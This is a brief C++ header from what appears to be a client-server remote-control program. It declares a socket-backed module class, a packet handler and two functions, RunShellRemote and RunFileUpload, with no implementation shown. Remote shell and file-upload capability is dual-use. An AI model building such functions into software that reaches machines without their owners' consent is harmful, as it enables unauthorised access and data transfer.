#pragma once

//VOID OnRecvShellRemotePacket(CPacket* pPacket);

#include "Packet.h"
#include "ClientManage.h"

class CModule {
public:
	CSocketClient*		m_pSocketClient;

public:
	CModule(CSocketClient* pSocketClient);
	~CModule();

	virtual void OnRecvChildSocketClientPacket(CPacket* pPacket);
};



void RunShellRemote(CSocketClient* pClient);
void RunFileUpload(CSocketClient* pClient);